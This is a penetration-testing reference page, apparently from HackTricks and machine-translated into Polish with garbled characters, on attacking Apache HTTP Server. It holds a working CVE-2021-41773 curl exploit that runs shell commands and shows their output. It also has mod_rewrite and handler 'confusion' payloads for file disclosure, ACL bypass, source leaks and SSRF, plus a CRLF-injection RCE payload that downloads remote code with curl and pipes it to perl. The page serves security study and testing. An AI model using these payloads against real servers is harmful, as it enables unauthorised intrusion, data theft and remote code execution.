# Apache

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Wykonywalne rozszerzenia PHP

SprawdÅº, ktÃ³re rozszerzenia sÄ… uruchamiane przez serwer Apache. Aby je wyszukaÄ‡, moÅ¼esz wykonaÄ‡:
```bash
grep -R -B1 "httpd-php" /etc/apache2
```
RÃ³wnieÅ¼ niektÃ³re miejsca, w ktÃ³rych moÅ¼esz znaleÅºÄ‡ tÄ™ konfiguracjÄ™, to:
```bash
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```
## CVE-2021-41773

{% code overflow="wrap" %}
```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```
{% endcode %}

## Atak konfuzji <a href="#a-whole-new-attack-confusion-attack" id="a-whole-new-attack-confusion-attack"></a>

Te typy atakÃ³w zostaÅ‚y wprowadzone i udokumentowane [**przez Orange w tym poÅ›cie na blogu**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1), a poniÅ¼ej znajduje siÄ™ podsumowanie. Atak "konfuzji" zasadniczo wykorzystuje to, jak dziesiÄ…tki moduÅ‚Ã³w wspÃ³Å‚pracujÄ…cych w Apache nie dziaÅ‚ajÄ… idealnie zsynchronizowane, co sprawia, Å¼e modyfikacja nieoczekiwanych danych przez niektÃ³re z nich moÅ¼e spowodowaÄ‡ lukÄ™ w pÃ³Åºniejszym module.

### Konfuzja nazwy pliku

#### Skracanie

**`mod_rewrite`** obetnie zawartoÅ›Ä‡ `r->filename` po znaku `?` ([_**modules/mappers/mod\_rewrite.c#L4141**_](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod\_rewrite.c#L4141)). To nie jest caÅ‚kowicie bÅ‚Ä™dne, poniewaÅ¼ wiÄ™kszoÅ›Ä‡ moduÅ‚Ã³w traktuje `r->filename` jako URL. Jednak w innych przypadkach bÄ™dzie to traktowane jako Å›cieÅ¼ka do pliku, co moÅ¼e spowodowaÄ‡ problem.

* **Skracanie Å›cieÅ¼ki**

MoÅ¼na wykorzystaÄ‡ `mod_rewrite` jak w poniÅ¼szym przykÅ‚adzie reguÅ‚y, aby uzyskaÄ‡ dostÄ™p do innych plikÃ³w w systemie plikÃ³w, usuwajÄ…c ostatniÄ… czÄ™Å›Ä‡ oczekiwanej Å›cieÅ¼ki, dodajÄ…c po prostu `?`:
```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# Expected
curl http://server/user/orange
# the output of file `/var/user/orange/profile.yml`

# Attack
curl http://server/user/orange%2Fsecret.yml%3F
#Â the output of file `/var/user/orange/secret.yml`
```
* **Wprowadzenie w bÅ‚Ä…d przypisania RewriteFlag**

W poniÅ¼szej regule przepisywania, dopÃ³ki URL koÅ„czy siÄ™ na .php, bÄ™dzie traktowany i wykonywany jako php. Dlatego moÅ¼liwe jest wysÅ‚anie URL, ktÃ³ry koÅ„czy siÄ™ na .php po znaku `?`, podczas gdy w Å›cieÅ¼ce Å‚adowany jest inny typ pliku (jak obrazek) z zÅ‚oÅ›liwym kodem php w Å›rodku:
```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# Attacker uploads a gif file with some php code
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# Make the server execute the php code
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
#### **ACL Bypass**

MoÅ¼liwe jest uzyskanie dostÄ™pu do plikÃ³w, do ktÃ³rych uÅ¼ytkownik nie powinien mieÄ‡ dostÄ™pu, nawet jeÅ›li dostÄ™p powinien byÄ‡ zabroniony w przypadku konfiguracji takich jak:
```xml
<Files "admin.php">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile "/etc/apache2/.htpasswd"
Require valid-user
</Files>
```
To dlatego, Å¼e domyÅ›lnie PHP-FPM odbierze adresy URL koÅ„czÄ…ce siÄ™ na `.php`, takie jak `http://server/admin.php%3Fooo.php`, a poniewaÅ¼ PHP-FPM usunie wszystko po znaku `?`, poprzedni adres URL pozwoli na zaÅ‚adowanie `/admin.php`, nawet jeÅ›li poprzednia reguÅ‚a tego zabraniaÅ‚a.

### DocumentRoot Confusion
```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```
A fun fact about Apache is that the previous rewrite will try to access the file from both the documentRoot and from root. So, a request to `https://server/abouth.html` will check for the file in `/var/www/html/about.html` and `/about.html` in the file system. Which basically can be abused to access files in the file system.

#### **Ujawnienie kodu ÅºrÃ³dÅ‚owego po stronie serwera**

* **Ujawnij kod ÅºrÃ³dÅ‚owy CGI**

Just adding a %3F at the end is enough to leak the source code of a cgi module:
```bash
curl http://server/cgi-bin/download.cgi
# the processed result from download.cgi
curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# #!/usr/bin/perl
# use CGI;
# ...
# # the source code of download.cgi
```
* **Ujawnienie kodu ÅºrÃ³dÅ‚owego PHP**

JeÅ›li serwer ma rÃ³Å¼ne domeny, z jednÄ… z nich bÄ™dÄ…cÄ… domenÄ… statycznÄ…, moÅ¼na to wykorzystaÄ‡ do przeszukiwania systemu plikÃ³w i ujawnienia kodu php:
```bash
# Leak the config.php file of the www.local domain from the static.local domain
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# the source code of config.php
```
#### **Manipulacja lokalnymi gadÅ¼etami**

GÅ‚Ã³wnym problemem poprzedniego ataku jest to, Å¼e domyÅ›lnie wiÄ™kszoÅ›Ä‡ dostÄ™pu do systemu plikÃ³w bÄ™dzie zablokowana, jak w [szablonie konfiguracji](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115) serwera Apache HTTP.
```xml
<Directory />
AllowOverride None
Require all denied
</Directory>
```
Jednak systemy operacyjne [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) domyÅ›lnie pozwalajÄ… na `/usr/share`:
```xml
<Directory /usr/share>
AllowOverride None
Require all granted
</Directory>
```
Zatem moÅ¼liwe byÅ‚oby **naduÅ¼ycie plikÃ³w znajdujÄ…cych siÄ™ w `/usr/share` w tych dystrybucjach.**

**Lokalny Gadget do ujawnienia informacji**

* **Apache HTTP Server** z **websocketd** moÅ¼e ujawniaÄ‡ skrypt **dump-env.php** w **/usr/share/doc/websocketd/examples/php/**, co moÅ¼e prowadziÄ‡ do ujawnienia wraÅ¼liwych zmiennych Å›rodowiskowych.
* Serwery z **Nginx** lub **Jetty** mogÄ… ujawniaÄ‡ wraÅ¼liwe informacje o aplikacjach webowych (np. **web.xml**) poprzez swoje domyÅ›lne katalogi webowe umieszczone w **/usr/share**:
* **/usr/share/nginx/html/**
* **/usr/share/jetty9/etc/**
* **/usr/share/jetty9/webapps/**

**Lokalny Gadget do XSS**

* Na Ubuntu Desktop z **zainstalowanym LibreOffice**, wykorzystanie funkcji zmiany jÄ™zyka w plikach pomocy moÅ¼e prowadziÄ‡ do **Cross-Site Scripting (XSS)**. Manipulowanie URL w **/usr/share/libreoffice/help/help.html** moÅ¼e przekierowaÄ‡ na zÅ‚oÅ›liwe strony lub starsze wersje poprzez **niebezpieczne RewriteRule**.

**Lokalny Gadget do LFI**

* JeÅ›li zainstalowane sÄ… PHP lub niektÃ³re pakiety front-endowe, takie jak **JpGraph** lub **jQuery-jFeed**, ich pliki mogÄ… byÄ‡ wykorzystywane do odczytu wraÅ¼liwych plikÃ³w, takich jak **/etc/passwd**:
* **/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php**
* **/usr/share/javascript/jquery-jfeed/proxy.php**
* **/usr/share/moodle/mod/assignment/type/wims/getcsv.php**

**Lokalny Gadget do SSRF**

* WykorzystujÄ…c **magpie\_debug.php** z **MagpieRSS** w **/usr/share/php/magpierss/scripts/magpie\_debug.php**, moÅ¼na Å‚atwo stworzyÄ‡ lukÄ™ SSRF, co zapewnia bramÄ™ do dalszych exploitÃ³w.

**Lokalny Gadget do RCE**

* MoÅ¼liwoÅ›ci **Remote Code Execution (RCE)** sÄ… ogromne, z podatnymi instalacjami, takimi jak przestarzaÅ‚y **PHPUnit** lub **phpLiteAdmin**. MogÄ… byÄ‡ one wykorzystywane do wykonywania dowolnego kodu, co pokazuje ogromny potencjaÅ‚ manipulacji lokalnymi gadÅ¼etami.

#### **Jailbreak z lokalnych gadÅ¼etÃ³w**

MoÅ¼liwe jest rÃ³wnieÅ¼ uzyskanie jailbreaka z dozwolonych folderÃ³w, podÄ…Å¼ajÄ…c za symlinkami generowanymi przez zainstalowane oprogramowanie w tych folderach, takich jak:

* **Cacti Log**: `/usr/share/cacti/site/` -> `/var/log/cacti/`
* **Solr Data**: `/usr/share/solr/data/` -> `/var/lib/solr/data`
* **Solr Config**: `/usr/share/solr/conf/` -> `/etc/solr/conf/`
* **MediaWiki Config**: `/usr/share/mediawiki/config/` -> `/var/lib/mediawiki/config/`
* **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -> `/etc/simplesamlphp/`

Ponadto, naduÅ¼ywajÄ…c symlinkÃ³w, moÅ¼liwe byÅ‚o uzyskanie **RCE w Redmine.**

### Confuzja Handlera <a href="#id-3-handler-confusion" id="id-3-handler-confusion"></a>

Ten atak wykorzystuje nakÅ‚adanie siÄ™ funkcji miÄ™dzy dyrektywami `AddHandler` i `AddType`, ktÃ³re mogÄ… byÄ‡ uÅ¼ywane do **wÅ‚Ä…czania przetwarzania PHP**. PoczÄ…tkowo te dyrektywy wpÅ‚ywaÅ‚y na rÃ³Å¼ne pola (`r->handler` i `r->content_type` odpowiednio) w wewnÄ™trznej strukturze serwera. Jednak z powodu kodu dziedziczonego, Apache obsÅ‚uguje te dyrektywy zamiennie w okreÅ›lonych warunkach, przeksztaÅ‚cajÄ…c `r->content_type` w `r->handler`, jeÅ›li ten pierwszy jest ustawiony, a drugi nie.

Ponadto, w Apache HTTP Server (`server/config.c#L420`), jeÅ›li `r->handler` jest pusty przed wykonaniem `ap_run_handler()`, serwer **uÅ¼ywa `r->content_type` jako handlera**, co skutkuje tym, Å¼e `AddType` i `AddHandler` sÄ… identyczne w skutkach.

#### **Nadpisanie Handlera w celu ujawnienia kodu ÅºrÃ³dÅ‚owego PHP**

W [**tej prezentacji**](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013\_dmitriev-maksim.pdf) przedstawiono lukÄ™, w ktÃ³rej niepoprawny `Content-Length` wysÅ‚any przez klienta moÅ¼e spowodowaÄ‡, Å¼e Apache bÅ‚Ä™dnie **zwrÃ³ci kod ÅºrÃ³dÅ‚owy PHP**. DziaÅ‚o siÄ™ tak z powodu problemu z obsÅ‚ugÄ… bÅ‚Ä™dÃ³w w ModSecurity i Apache Portable Runtime (APR), gdzie podwÃ³jna odpowiedÅº prowadzi do nadpisania `r->content_type` na `text/html`.\
PoniewaÅ¼ ModSecurity nie obsÅ‚uguje poprawnie wartoÅ›ci zwracanych, zwracaÅ‚by kod PHP i nie interpretowaÅ‚by go.

#### **Nadpisanie Handlera do XXXX**

TODO: Orange jeszcze nie ujawnili tej luki

### **WywoÅ‚anie dowolnych handlerÃ³w**

JeÅ›li atakujÄ…cy jest w stanie kontrolowaÄ‡ nagÅ‚Ã³wek **`Content-Type`** w odpowiedzi serwera, bÄ™dzie mÃ³gÅ‚ **wywoÅ‚aÄ‡ dowolne handlera moduÅ‚Ã³w**. Jednak w momencie, gdy atakujÄ…cy kontroluje to, wiÄ™kszoÅ›Ä‡ procesu Å¼Ä…dania bÄ™dzie juÅ¼ zakoÅ„czona. MoÅ¼liwe jest jednak **ponowne uruchomienie procesu Å¼Ä…dania, naduÅ¼ywajÄ…c nagÅ‚Ã³wka `Location`**, poniewaÅ¼ jeÅ›li **r**eturned `Status` to 200, a nagÅ‚Ã³wek `Location` zaczyna siÄ™ od `/`, odpowiedÅº jest traktowana jako przekierowanie po stronie serwera i powinna byÄ‡ przetworzona.

Zgodnie z [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) (specyfikacja dotyczÄ…ca CGI) w [Sekcji 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) definiuje zachowanie odpowiedzi lokalnego przekierowania:

> Skrypt CGI moÅ¼e zwrÃ³ciÄ‡ Å›cieÅ¼kÄ™ URI i ciÄ…g zapytania (â€˜local-pathqueryâ€™) dla lokalnego zasobu w polu nagÅ‚Ã³wka Location. To wskazuje serwerowi, Å¼e powinien ponownie przetworzyÄ‡ Å¼Ä…danie, uÅ¼ywajÄ…c okreÅ›lonej Å›cieÅ¼ki.

Zatem, aby przeprowadziÄ‡ ten atak, potrzebna jest jedna z nastÄ™pujÄ…cych luk:

* WstrzykniÄ™cie CRLF w nagÅ‚Ã³wkach odpowiedzi CGI
* SSRF z peÅ‚nÄ… kontrolÄ… nad nagÅ‚Ã³wkami odpowiedzi

#### **Dowolny Handler do ujawnienia informacji**

Na przykÅ‚ad `/server-status` powinien byÄ‡ dostÄ™pny tylko lokalnie:
```xml
<Location /server-status>
SetHandler server-status
Require local
</Location>
```
MoÅ¼liwe jest uzyskanie dostÄ™pu, ustawiajÄ…c `Content-Type` na `server-status` i nagÅ‚Ã³wek Location zaczynajÄ…cy siÄ™ od `/`
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```
#### **Arbitrary Handler to Full SSRF**

Przekierowanie do `mod_proxy`, aby uzyskaÄ‡ dostÄ™p do dowolnego protokoÅ‚u na dowolnym URL:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
%0d%0a
%0d%0a
```
Jednak nagÅ‚Ã³wek `X-Forwarded-For` jest dodawany, co uniemoÅ¼liwia dostÄ™p do punktÃ³w koÅ„cowych metadanych w chmurze.

#### **Arbitralny handler do uzyskania dostÄ™pu do lokalnego gniazda Unix Domain**

Uzyskaj dostÄ™p do lokalnego gniazda Unix Domain PHP-FPM, aby wykonaÄ‡ PHP backdoor znajdujÄ…cy siÄ™ w `/tmp/`:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```
#### **Arbitralny handler do RCE**

Oficjalny [obraz PHP Docker](https://hub.docker.com/\_/php) zawiera PEAR (`Pearcmd.php`), narzÄ™dzie do zarzÄ…dzania pakietami PHP w wierszu poleceÅ„, ktÃ³re moÅ¼na wykorzystaÄ‡ do uzyskania RCE:
```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
SprawdÅº [**Docker PHP LFI Summary**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), napisany przez [Phith0n](https://x.com/phithon\_xg) dla szczegÃ³Å‚Ã³w tej techniki.

## Referencje

* [https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
